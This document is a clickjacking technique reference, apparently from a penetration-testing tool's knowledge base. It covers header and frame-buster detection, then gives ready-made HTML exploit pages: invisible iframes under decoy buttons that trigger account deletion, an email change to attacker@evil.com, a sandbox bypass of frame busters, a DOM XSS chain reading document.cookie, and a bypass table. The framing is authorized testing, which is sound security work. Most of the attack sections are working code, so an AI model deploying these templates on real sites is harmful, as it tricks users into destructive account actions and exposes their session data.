---
id: PS-CLICK
category: Clickjacking
wstg_refs: [WSTG-CLNT-09]
lab_count: 5
---

# Clickjacking: Attack Technique Reference

## 1. Detection

### 1A. Header-Based Detection

Check response headers for framing protection. Send a standard GET request and inspect:

```bash
# Check framing headers
http_probe -sk -D- -o /dev/null <target-url> | grep -iE 'x-frame-options|frame-ancestors'
```

| Header | Value | Protection Level |
|--------|-------|-----------------|
| `X-Frame-Options: DENY` | Blocks all framing | Strong |
| `X-Frame-Options: SAMEORIGIN` | Allows same-origin framing only | Strong |
| `X-Frame-Options: ALLOW-FROM <uri>` | Allows specific origin | Weak (deprecated in Chrome 76+, Safari 12) |
| `Content-Security-Policy: frame-ancestors 'none'` | CSP equivalent of DENY | Strong |
| `Content-Security-Policy: frame-ancestors 'self'` | CSP equivalent of SAMEORIGIN | Strong |
| `Content-Security-Policy: frame-ancestors <domain>` | CSP whitelist | Strong if correctly configured |
| No framing headers | None | Vulnerable |

**Priority order:** CSP `frame-ancestors` takes precedence over `X-Frame-Options` when both are present.

### 1B. Frame Buster Detection

Search JavaScript source for frame-busting scripts:

```javascript
// Common frame buster patterns to search for
/if\s*\(\s*(window\.)?top\s*!==?\s*(window\.)?self\s*\)/g
/if\s*\(\s*(window\.)?self\s*!==?\s*(window\.)?top\s*\)/g
/if\s*\(\s*parent\.frames\.length/g
/top\.location\s*=\s*self\.location/g
/(window\.)?top\.location\s*=\s*(window\.)?location/g
```

### 1C. Quick Iframe Test

Attempt to load the target in an iframe. If it renders, the page is frameable:

```html
<html>
<body>
<iframe src="https://target.com/sensitive-action" width="800" height="600"></iframe>
<p>If the target page renders above, it is vulnerable to clickjacking.</p>
</body>
</html>
```

## 2. Techniques

### 2A. Basic Iframe Overlay

Layer a transparent iframe containing the target page over attacker-controlled decoy content. The victim clicks what they think is the decoy but actually interacts with the hidden target.

**CSS requirements:**
- `opacity: 0.0001` (or close to 0) makes the iframe invisible
- `z-index: 2` places the target above the decoy (`z-index: 1`)
- `position: absolute/relative` for precise alignment
- Pixel-precise `width`, `height`, `top`, `left` to overlay the target button

**PoC template — basic clickjacking with CSRF token bypass:**

```html
<html>
<head>
  <style>
    #target-iframe {
      position: relative;
      width: 500px;
      height: 700px;
      opacity: 0.0001;
      z-index: 2;
    }
    #decoy-page {
      position: absolute;
      top: 0;
      left: 0;
      width: 500px;
      height: 700px;
      z-index: 1;
    }
    #decoy-button {
      position: absolute;
      top: 495px;
      left: 60px;
      z-index: 1;
    }
  </style>
</head>
<body>
  <div id="decoy-page">
    <h1>Win a Prize!</h1>
    <button id="decoy-button">Click here to claim!</button>
  </div>
  <iframe id="target-iframe" src="https://target.com/account/delete"></iframe>
</body>
</html>
```

**Why this bypasses CSRF tokens:** The iframe loads the authentic page with a valid CSRF token already embedded. The victim's click submits the real form with the real token. Clickjacking is effective precisely because the CSRF token is present and valid within the framed page.

> Lab refs: PS-CLICK-01, PS-CLICK-02

### 2B. Clickjacking with Prefilled Form Data

If the target page accepts URL parameters to prefill form fields, the attacker can combine prefilling with clickjacking to make the victim submit attacker-chosen values.

**PoC template — prefilled email change:**

```html
<html>
<head>
  <style>
    #target-iframe {
      position: relative;
      width: 500px;
      height: 700px;
      opacity: 0.0001;
      z-index: 2;
    }
    #decoy-button {
      position: absolute;
      top: 450px;
      left: 80px;
      z-index: 1;
    }
  </style>
</head>
<body>
  <h1>Free Download</h1>
  <button id="decoy-button">Download Now</button>
  <iframe id="target-iframe" src="https://target.com/account?email=attacker@evil.com"></iframe>
</body>
</html>
```

> Lab refs: PS-CLICK-02

### 2C. Frame Buster Bypass via sandbox Attribute

The HTML5 `sandbox` attribute on an iframe restricts the framed page's capabilities. When set with `allow-forms` but WITHOUT `allow-top-navigation`, JavaScript-based frame busters are neutralized because the framed page cannot check or change `top.location`.

**PoC template — bypassing frame buster scripts:**

```html
<html>
<head>
  <style>
    #target-iframe {
      position: relative;
      width: 500px;
      height: 700px;
      opacity: 0.0001;
      z-index: 2;
    }
    #decoy-button {
      position: absolute;
      top: 450px;
      left: 80px;
      z-index: 1;
    }
  </style>
</head>
<body>
  <h1>Congratulations!</h1>
  <button id="decoy-button">Claim Your Reward</button>
  <iframe id="target-iframe"
    src="https://target.com/account/delete"
    sandbox="allow-forms">
  </iframe>
</body>
</html>
```

**sandbox attribute values for clickjacking:**

| Value | Effect | When to Use |
|-------|--------|-------------|
| `sandbox="allow-forms"` | Forms submit but JS frame busters blocked | Target uses JS frame busting + form submission |
| `sandbox="allow-forms allow-scripts"` | Forms + scripts work, but no top-navigation | Target needs JS for the form to work |
| `sandbox="allow-forms allow-same-origin"` | Cookies sent, forms work, no top-navigation | Target requires cookies for the action |

**Key:** Never include `allow-top-navigation` — that would re-enable frame busters.

> Lab refs: PS-CLICK-03

### 2D. Clickjacking Combined with DOM XSS

When the target page has a DOM-based XSS vulnerability, clickjacking can trigger it by making the victim click a link or button that activates the XSS payload. This chains two lower-severity issues into a high-severity attack.

**Attack flow:**
1. Identify a DOM XSS on the target (e.g., via URL parameter reflected into innerHTML)
2. Craft the XSS payload URL
3. Load it in a clickjacking iframe
4. Position the decoy to make the victim trigger the XSS action

**PoC template — clickjacking to trigger DOM XSS:**

```html
<html>
<head>
  <style>
    #target-iframe {
      position: relative;
      width: 500px;
      height: 700px;
      opacity: 0.0001;
      z-index: 2;
    }
    #decoy-button {
      position: absolute;
      top: 80px;
      left: 100px;
      z-index: 1;
      font-size: 18px;
    }
  </style>
</head>
<body>
  <h1>Check Your Score</h1>
  <button id="decoy-button">View Results</button>
  <iframe id="target-iframe"
    src="https://target.com/feedback?name=<img src=x onerror=alert(document.cookie)>">
  </iframe>
</body>
</html>
```

**Impact elevation:** DOM XSS alone may require the victim to click a malicious link. Combined with clickjacking, the victim only needs to visit the attacker's page and click a decoy button — no suspicious URL visible.

> Lab refs: PS-CLICK-04

### 2E. Multi-Step Clickjacking

When the target action requires multiple sequential clicks (e.g., confirmation dialogs like "Are you sure? Yes/No"), the attacker must create multiple decoy elements positioned over each target button in sequence.

**PoC template — two-step clickjacking:**

```html
<html>
<head>
  <style>
    #target-iframe {
      position: relative;
      width: 500px;
      height: 700px;
      opacity: 0.0001;
      z-index: 2;
    }
    #decoy-button-1 {
      position: absolute;
      top: 330px;
      left: 50px;
      z-index: 1;
    }
    #decoy-button-2 {
      position: absolute;
      top: 460px;
      left: 200px;
      z-index: 1;
    }
  </style>
</head>
<body>
  <h1>Complete Survey</h1>
  <button id="decoy-button-1">Step 1: Select Answer</button>
  <button id="decoy-button-2">Step 2: Submit</button>
  <iframe id="target-iframe" src="https://target.com/account/delete"></iframe>
</body>
</html>
```

**Alignment technique:**
1. Set `opacity: 0.5` during development to see both layers
2. Adjust `top` and `left` pixel values until each decoy button aligns with the corresponding target button
3. Set `opacity: 0.0001` for the final exploit

> Lab refs: PS-CLICK-05

## 3. PoC Template (Universal)

Use this template as a starting point for all clickjacking tests. Adjust coordinates and target URL.

```html
<html>
<head>
  <style>
    /* During development: set to 0.5 to see alignment. For exploit: set to 0.0001 */
    #target-iframe {
      position: relative;
      width: 700px;
      height: 900px;
      opacity: 0.0001;   /* Change to 0.5 for alignment testing */
      z-index: 2;
    }
    #decoy-container {
      position: absolute;
      top: 0;
      left: 0;
      z-index: 1;
    }
    /* Position this over the target's clickable element */
    .decoy-button {
      position: absolute;
      top: 500px;    /* Adjust to match target button Y position */
      left: 100px;   /* Adjust to match target button X position */
      padding: 15px 40px;
      font-size: 20px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div id="decoy-container">
    <h1>Appealing Content Here</h1>
    <p>Some reason for the user to click below</p>
    <button class="decoy-button">Click Me!</button>
  </div>
  <iframe id="target-iframe"
    src="https://TARGET-URL/sensitive-action"
    sandbox="allow-forms allow-scripts allow-same-origin">
  </iframe>
</body>
</html>
```

**Calibration steps:**
1. Set opacity to `0.5`
2. Load in browser and identify the target button's pixel position
3. Adjust `.decoy-button` `top` and `left` to overlay precisely
4. Set opacity to `0.0001`
5. Test: does clicking the decoy trigger the target action?

## 4. Defense Bypass Reference

| Defense | Bypass | Limitation |
|---------|--------|-----------|
| `X-Frame-Options: ALLOW-FROM` | Not supported in Chrome 76+ or Safari 12 — page is frameable in those browsers | Works if victim uses Chrome/Safari |
| JavaScript frame busters (`top !== self`) | `sandbox="allow-forms"` attribute neutralizes JS | Does not work if CSP `frame-ancestors` is set |
| `sandbox="allow-forms allow-scripts"` without `allow-top-navigation` | Frame busters run but cannot navigate top frame | Reliable bypass |
| Browser opacity threshold detection | Use `opacity: 0.0001` instead of `0` — Chrome 76+ detects `opacity: 0` | Threshold varies by browser |
| Double-framing defenses (`top.location` checks) | Triple-frame or use sandbox to block navigation | Complex but effective |
| Partial CSP (`frame-ancestors 'self'`) | Exploit XSS on same origin to host the clickjacking page | Requires XSS on the target |
| No `X-Frame-Options` on specific pages | Target pages that explicitly lack the header (API responses, error pages, static content) | Scope limited to unprotected pages |
## Rynix workflow

1. `get_technique_guide` for `clickjacking` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `http_probe`, `list_frontend_routes`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `http_probe`
- `list_frontend_routes`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

